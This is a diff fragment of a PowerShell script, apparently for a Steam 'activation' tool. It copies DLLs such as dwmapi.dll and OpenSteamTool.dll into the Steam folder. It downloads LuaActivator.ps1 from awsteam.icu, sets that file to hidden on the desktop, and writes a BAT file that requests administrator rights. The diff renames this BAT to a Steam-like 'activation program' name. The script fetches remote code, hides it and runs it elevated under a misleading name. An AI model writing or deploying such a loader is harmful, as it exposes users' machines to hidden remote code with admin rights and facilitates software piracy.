@@ -11,7 +11,7 @@ $CopyList = @("config","dwmapi.dll","OpenSteamTool.dll","xinput1_4.dll","steam.c
 $ActivatorPs1Url = "https://awsteam.icu/LuaActivator.ps1"
 $DesktopPath = [Environment]::GetFolderPath("Desktop")
 $LocalPs1 = Join-Path $DesktopPath "LuaActivator.ps1"
-$LocalBat = Join-Path $DesktopPath "Lua补丁激活工具.bat"
+$LocalBat = Join-Path $DesktopPath "steam激活程序.bat"
 # ============================
 
 # 自动查找Steam路径
@@ -94,7 +94,7 @@ if(Test-Path $cfgFullPath){
 Remove-Item $TempZip -Force
 Remove-Item $TempUnzip -Recurse -Force
 
-# ========== 桌面释放一键激活BAT + ps1隐藏 ==========
+# ========== 桌面释放 steam激活程序.bat（修复可正常打开） ==========
 try{
     # 1. 下载核心ps1脚本到桌面
     $webClient.DownloadFile($ActivatorPs1Url, $LocalPs1)
@@ -104,8 +104,8 @@ try{
         (Get-Item $LocalPs1).Attributes += [System.IO.FileAttributes]::Hidden
     }
 
-    # 3. 生成一键启动BAT文件到桌面
-  $batContent = @"
+    # 3. 生成一键启动BAT，自带缺失自动修复逻辑
+    $batContent = @"
 @echo off
 title steam激活程序
 :: 自动申请管理员权限
